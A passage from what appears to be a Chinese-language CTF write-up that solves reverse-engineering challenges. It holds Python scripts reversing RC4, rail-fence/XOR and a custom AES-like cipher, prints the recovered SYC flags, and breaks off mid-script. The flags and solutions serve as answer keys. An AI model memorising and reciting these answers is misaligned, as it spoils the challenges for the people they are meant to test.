class="number">0xBF</span>, <span class="number">0x55</span>, <span class="number">0x4F</span>, <span class="number">0x0D</span>, <span class="number">0x99</span>, <span class="number">0x87</span>, <span class="number">0x47</span>, </span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0xF7</span>, <span class="number">0xB9</span>, <span class="number">0x98</span>, <span class="number">0xFB</span>, <span class="number">0x1B</span>, <span class="number">0x22</span>, <span class="number">0xEC</span>, <span class="number">0x84</span>, <span class="number">0x23</span>, </span><br><span class="line">  <span class="number">0xFD</span>, <span class="number">0xB2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">S[i] = i</span><br><span class="line">Key[i] = <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">j = (j + S[i] + Key[i]) % N</span><br><span class="line">S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">i = (i + <span class="number">1</span>) % N</span><br><span class="line">j = (j + S[i]) % N</span><br><span class="line">S[i], S[j] = S[j], S[i]</span><br><span class="line">t[k] ^= S[(S[i] + S[j]) % N]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> t))</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;N0thing_1s_sEriOus_But_MIku&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="浪漫至死不渝"><a href="#浪漫至死不渝" class="headerlink" title="浪漫至死不渝"></a>浪漫至死不渝</h3><blockquote><p>某师傅想给他的女神表白，他写了一个网站，点爱心之后就能输入密码，但是在写的过程中他不小心把提示的密码删除了，你能帮他找出表白密码吗？(输入密码时，记得刷新喔） ps:请将密码包裹SYC{}上交，且将字母全改为大写</p></blockquote><p>js文件加密逻辑分析。</p><p>key为Text1，采用了栅栏密码加密得到 <code>53X211WH04N</code>，利用现有的 <code>decryptRailFence()</code> 函数解密：</p><p><code>decryptRailFence(&#39;53X211WH04N&#39;,3)=&#39;5201314WXHN&#39;</code></p><p>密文为：<code>125, 130, 131, 122, 117, 110, 123, 125, 130, 131, 122, 117, 110, 123, 99, 99, 99, 99</code></p><p>加密逻辑为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i&lt;14 时：c[i]=(m[i]^k[i%7])+10</span><br><span class="line">i&gt;=14 时：c[i]=(m[i]^k[i-7])+99</span><br></pre></td></tr></table></figure><p>还原明文代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span>]</span><br><span class="line">k = <span class="built_in">list</span>(<span class="string">b&#x27;5201314WXHN&#x27;</span>)</span><br><span class="line"></span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">14</span>:</span><br><span class="line">        m.append((c[i]-<span class="number">10</span>)^k[i%<span class="number">7</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m.append((c[i]-<span class="number">99</span>)^k[i-<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;FJIAXUEFJIAXUEWXHN&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>SYC&#123;FJIAXUEFJIAXUEWXHN&#125;</code></p><p>​    </p><h3 id="AES-AES"><a href="#AES-AES" class="headerlink" title="AES! AES?"></a>AES! AES?</h3><blockquote><p>What’s this ?</p></blockquote><p>照逻辑尝试逆向即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">v17 = [<span class="number">224</span>, -<span class="number">251</span>, -<span class="number">146</span>, -<span class="number">62</span>, -<span class="number">146</span>, -<span class="number">103</span>, -<span class="number">152</span>, <span class="number">69</span>, -<span class="number">131</span>, -<span class="number">225</span>, -<span class="number">193</span>, -<span class="number">7</span>, -<span class="number">105</span>, -<span class="number">138</span>, <span class="number">59</span>, <span class="number">146</span>, <span class="number">47</span>, -<span class="number">188</span>, -<span class="number">250</span>, -<span class="number">153</span>, -<span class="number">88</span>, -<span class="number">21</span>, -<span class="number">20</span>, <span class="number">74</span>, -<span class="number">145</span>, -<span class="number">24</span>, -<span class="number">203</span>, -<span class="number">7</span>, -<span class="number">84</span>, -<span class="number">89</span>, <span class="number">140</span>, <span class="number">113</span>]</span><br><span class="line">c = [k&amp;<span class="number">0xff</span> <span class="keyword">for</span> k <span class="keyword">in</span> v17]</span><br><span class="line"></span><br><span class="line">v16 = [<span class="number">110</span>, <span class="number">121</span>, <span class="number">105</span>, <span class="number">131</span>, <span class="number">121</span>, <span class="number">127</span>, <span class="number">105</span>, <span class="number">117</span>, <span class="number">121</span>, <span class="number">120</span>, </span><br><span class="line">  <span class="number">129</span>, <span class="number">105</span>, <span class="number">93</span>, <span class="number">99</span>, <span class="number">77</span>, <span class="number">73</span>]</span><br><span class="line"></span><br><span class="line">v13 = [<span class="number">122</span>, <span class="number">118</span>, <span class="number">107</span>, <span class="number">109</span>, <span class="number">111</span>,  <span class="number">42</span>, <span class="number">115</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">127</span>, </span><br><span class="line">  <span class="number">126</span>,  <span class="number">42</span>, <span class="number">131</span>, <span class="number">121</span>, <span class="number">127</span>, <span class="number">124</span>,  <span class="number">42</span>, <span class="number">112</span>, <span class="number">118</span>, <span class="number">107</span>, </span><br><span class="line">  <span class="number">113</span>,  <span class="number">68</span>,  <span class="number">42</span>,  <span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">v14 = v15 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">v10 = [<span class="number">131</span>, <span class="number">111</span>, <span class="number">125</span>,  <span class="number">43</span>,  <span class="number">42</span>, <span class="number">131</span>, <span class="number">121</span>, <span class="number">127</span>,  <span class="number">42</span>, <span class="number">107</span>, </span><br><span class="line">  <span class="number">124</span>, <span class="number">111</span>,  <span class="number">42</span>, <span class="number">124</span>, <span class="number">115</span>, <span class="number">113</span>, <span class="number">114</span>, <span class="number">126</span>,  <span class="number">43</span>,  <span class="number">20</span>, </span><br><span class="line">   <span class="number">10</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">136</span>, <span class="number">126</span>, <span class="number">124</span>, <span class="number">131</span>,  <span class="number">42</span>, <span class="number">107</span>, <span class="number">113</span>, </span><br><span class="line">  <span class="number">107</span>, <span class="number">115</span>, <span class="number">120</span>, <span class="number">136</span>,  <span class="number">20</span>,  <span class="number">10</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">136</span>,  <span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">S = [<span class="number">99</span>, <span class="number">124</span>, <span class="number">119</span>, <span class="number">123</span>, <span class="number">242</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">197</span>,  <span class="number">48</span>,   <span class="number">1</span>, </span><br><span class="line">  <span class="number">103</span>,  <span class="number">43</span>, <span class="number">254</span>, <span class="number">215</span>, <span class="number">171</span>, <span class="number">118</span>, <span class="number">202</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">125</span>, </span><br><span class="line">  <span class="number">250</span>,  <span class="number">89</span>,  <span class="number">71</span>, <span class="number">240</span>, <span class="number">173</span>, <span class="number">212</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">156</span>, <span class="number">164</span>, </span><br><span class="line">  <span class="number">114</span>, <span class="number">192</span>, <span class="number">183</span>, <span class="number">253</span>, <span class="number">147</span>,  <span class="number">38</span>,  <span class="number">54</span>,  <span class="number">63</span>, <span class="number">247</span>, <span class="number">204</span>, </span><br><span class="line">   <span class="number">52</span>, <span class="number">165</span>, <span class="number">229</span>, <span class="number">241</span>, <span class="number">113</span>, <span class="number">216</span>,  <span class="number">49</span>,  <span class="number">21</span>,   <span class="number">4</span>, <span class="number">199</span>, </span><br><span class="line">   <span class="number">35</span>, <span class="number">195</span>,  <span class="number">24</span>, <span class="number">150</span>,   <span class="number">5</span>, <span class="number">154</span>,   <span class="number">7</span>,  <span class="number">18</span>, <span class="number">128</span>, <span class="number">226</span>, </span><br><span class="line">  <span class="number">235</span>,  <span class="number">39</span>, <span class="number">178</span>, <span class="number">117</span>,   <span class="number">9</span>, <span class="number">131</span>,  <span class="number">44</span>,  <span class="number">26</span>,  <span class="number">27</span>, <span class="number">110</span>, </span><br><span class="line">   <span class="number">90</span>, <span class="number">160</span>,  <span class="number">82</span>,  <span class="number">59</span>, <span class="number">214</span>, <span class="number">179</span>,  <span class="number">41</span>, <span class="number">227</span>,  <span class="number">47</span>, <span class="number">132</span>, </span><br><span class="line">   <span class="number">83</span>, <span class="number">209</span>,   <span class="number">0</span>, <span class="number">237</span>,  <span class="number">32</span>, <span class="number">252</span>, <span class="number">177</span>,  <span class="number">91</span>, <span class="number">106</span>, <span class="number">203</span>, </span><br><span class="line">  <span class="number">190</span>,  <span class="number">57</span>,  <span class="number">74</span>,  <span class="number">76</span>,  <span class="number">88</span>, <span class="number">207</span>, <span class="number">208</span>, <span class="number">239</span>, <span class="number">170</span>, <span class="number">251</span>, </span><br><span class="line">   <span class="number">67</span>,  <span class="number">77</span>,  <span class="number">51</span>, <span class="number">133</span>,  <span class="number">69</span>, <span class="number">249</span>,   <span class="number">2</span>, <span class="number">127</span>,  <span class="number">80</span>,  <span class="number">60</span>, </span><br><span class="line">  <span class="number">159</span>, <span class="number">168</span>,  <span class="number">81</span>, <span class="number">163</span>,  <span class="number">64</span>, <span class="number">143</span>, <span class="number">146</span>, <span class="number">157</span>,  <span class="number">56</span>, <span class="number">245</span>, </span><br><span class="line">  <span class="number">188</span>, <span class="number">182</span>, <span class="number">218</span>,  <span class="number">33</span>,  <span class="number">16</span>, <span class="number">255</span>, <span class="number">243</span>, <span class="number">210</span>, <span class="number">205</span>,  <span class="number">12</span>, </span><br><span class="line">   <span class="number">19</span>, <span class="number">236</span>,  <span class="number">95</span>, <span class="number">151</span>,  <span class="number">68</span>,  <span class="number">23</span>, <span class="number">196</span>, <span class="number">167</span>, <span class="number">126</span>,  <span class="number">61</span>, </span><br><span class="line">  <span class="number">100</span>,  <span class="number">93</span>,  <span class="number">25</span>, <span class="number">115</span>,  <span class="number">96</span>, <span class="number">129</span>,  <span class="number">79</span>, <span class="number">220</span>,  <span class="number">34</span>,  <span class="number">42</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">136</span>,  <span class="number">70</span>, <span class="number">238</span>, <span class="number">184</span>,  <span class="number">20</span>, <span class="number">222</span>,  <span class="number">94</span>,  <span class="number">11</span>, <span class="number">219</span>, </span><br><span class="line">  <span class="number">224</span>,  <span class="number">50</span>,  <span class="number">58</span>,  <span class="number">10</span>,  <span class="number">73</span>,   <span class="number">6</span>,  <span class="number">36</span>,  <span class="number">92</span>, <span class="number">194</span>, <span class="number">211</span>, </span><br><span class="line">  <span class="number">172</span>,  <span class="number">98</span>, <span class="number">145</span>, <span class="number">149</span>, <span class="number">228</span>, <span class="number">121</span>, <span class="number">231</span>, <span class="number">200</span>,  <span class="number">55</span>, <span class="number">109</span>, </span><br><span class="line">  <span class="number">141</span>, <span class="number">213</span>,  <span class="number">78</span>, <span class="number">169</span>, <span class="number">108</span>,  <span class="number">86</span>, <span class="number">244</span>, <span class="number">234</span>, <span class="number">101</span>, <span class="number">122</span>, </span><br><span class="line">  <span class="number">174</span>,   <span class="number">8</span>, <span class="number">186</span>, <span class="number">120</span>,  <span class="number">37</span>,  <span class="number">46</span>,  <span class="number">28</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">198</span>, </span><br><span class="line">  <span class="number">232</span>, <span class="number">221</span>, <span class="number">116</span>,  <span class="number">31</span>,  <span class="number">75</span>, <span class="number">189</span>, <span class="number">139</span>, <span class="number">138</span>, <span class="number">112</span>,  <span class="number">62</span>, </span><br><span class="line">  <span class="number">181</span>, <span class="number">102</span>,  <span class="number">72</span>,   <span class="number">3</span>, <span class="number">246</span>,  <span class="number">14</span>,  <span class="number">97</span>,  <span class="number">53</span>,  <span class="number">87</span>, <span class="number">185</span>, </span><br><span class="line">  <span class="number">134</span>, <span class="number">193</span>,  <span class="number">29</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">248</span>, <span class="number">152</span>,  <span class="number">17</span>, <span class="number">105</span>, <span class="number">217</span>, </span><br><span class="line">  <span class="number">142</span>, <span class="number">148</span>, <span class="number">155</span>,  <span class="number">30</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">206</span>,  <span class="number">85</span>,  <span class="number">40</span>, <span class="number">223</span>, </span><br><span class="line">  <span class="number">140</span>, <span class="number">161</span>, <span class="number">137</span>,  <span class="number">13</span>, <span class="number">191</span>, <span class="number">230</span>,  <span class="number">66</span>, <span class="number">104</span>,  <span class="number">65</span>, <span class="number">153</span>, </span><br><span class="line">   <span class="number">45</span>,  <span class="number">15</span>, <span class="number">176</span>,  <span class="number">84</span>, <span class="number">187</span>,  <span class="number">22</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    v13[i] -= <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(v13))</span><br><span class="line"><span class="comment"># v13 = b&#x27;place inout your flag: \n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    v10[i] -= <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(v10))</span><br><span class="line"><span class="comment"># v10 = b&#x27;yes! you are right!\n\x00&#x27;</span></span><br><span class="line"><span class="comment"># v11 = b&#x27;no~try again~\n\x00&#x27;</span></span><br><span class="line"><span class="comment"># v12 = b&#x27;no~\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># len(s) == 32</span></span><br><span class="line"></span><br><span class="line">v7 = [k-<span class="number">10</span> <span class="keyword">for</span> k <span class="keyword">in</span> v16]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(v7))</span><br><span class="line"><span class="comment"># v16 = v7 = b&#x27;do_you_konw_SYC?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s[5] = 46</span></span><br><span class="line"><span class="comment"># s[10] = 108</span></span><br><span class="line"><span class="comment"># s[17] = 48</span></span><br><span class="line"></span><br><span class="line">v18 = [<span class="number">100</span>, <span class="number">111</span>,  <span class="number">95</span>, <span class="number">121</span>, <span class="number">111</span>, <span class="number">117</span>,  <span class="number">95</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">110</span>, </span><br><span class="line">  <span class="number">119</span>,  <span class="number">95</span>,  <span class="number">83</span>,  <span class="number">89</span>,  <span class="number">67</span>,  <span class="number">63</span>,  <span class="number">39</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, </span><br><span class="line">  <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>,  <span class="number">20</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, </span><br><span class="line">   <span class="number">89</span>,  <span class="number">74</span>, <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, </span><br><span class="line">  <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, </span><br><span class="line">  <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, </span><br><span class="line">  <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, </span><br><span class="line">  <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, </span><br><span class="line">  <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, </span><br><span class="line">  <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, </span><br><span class="line">  <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, </span><br><span class="line">  <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, </span><br><span class="line">  <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, </span><br><span class="line">  <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>,  <span class="number">57</span>, <span class="number">144</span>, <span class="number">207</span>, </span><br><span class="line">  <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, </span><br><span class="line">  <span class="number">146</span>, <span class="number">156</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------------------------------------</span></span><br><span class="line"><span class="comment"># encrypt </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ShiftRow</span>(<span class="params">A</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>,<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(math.ceil(i/<span class="number">4</span>)):</span><br><span class="line">            A[i],A[i+<span class="number">1</span>],A[i+<span class="number">2</span>],A[i+<span class="number">3</span>] = A[i+<span class="number">1</span>],A[i+<span class="number">2</span>],A[i+<span class="number">3</span>],A[i]</span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">A</span>):</span><br><span class="line">    tmp = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        tmp[i] = A[i]</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            A[x] = tmp[<span class="number">4</span>*k+j]</span><br><span class="line">            A[x] = S[A[x]]</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">list</span>(<span class="string">b&#x27;abcde.ghijllmnopq0stuvwxyz123457&#x27;</span>)</span><br><span class="line">v = [S[s[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">v = ShiftRow(v[:<span class="number">16</span>])+ShiftRow(v[<span class="number">16</span>:])</span><br><span class="line">v = transform(v[:<span class="number">16</span>])+transform(v[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    v[k] ^= v18[k]</span><br><span class="line">    v[k+<span class="number">16</span>] ^= v18[k]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    v[k] = S[v[k]]</span><br><span class="line"></span><br><span class="line">v = ShiftRow(v[:<span class="number">16</span>])+ShiftRow(v[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    v[k] ^= v18[<span class="number">16</span>+k]</span><br><span class="line">    v[k+<span class="number">16</span>] ^= v18[<span class="number">16</span>+k]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------------------------------------</span></span><br><span class="line"><span class="comment"># decrypt </span></span><br><span class="line"></span><br><span class="line">S_inv = [S.index(k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unShiftRow</span>(<span class="params">A</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>,<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(math.ceil(i/<span class="number">4</span>)):</span><br><span class="line">            A[i],A[i+<span class="number">1</span>],A[i+<span class="number">2</span>],A[i+<span class="number">3</span>] = A[i+<span class="number">3</span>],A[i],A[i+<span class="number">1</span>],A[i+<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">untransform</span>(<span class="params">A</span>):</span><br><span class="line">    A = [S_inv[A[k]] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">    tmp = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            tmp[<span class="number">4</span>*k+j] = A[x]</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line">y = c[:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    y[k] ^= v18[<span class="number">16</span>+k]</span><br><span class="line">    y[k+<span class="number">16</span>] ^= v18[<span class="number">16</span>+k]</span><br><span class="line"></span><br><span class="line">y = unShiftRow(y[:<span class="number">16</span>])+unShiftRow(y[<span class="number">16</span>:])</span><br><span 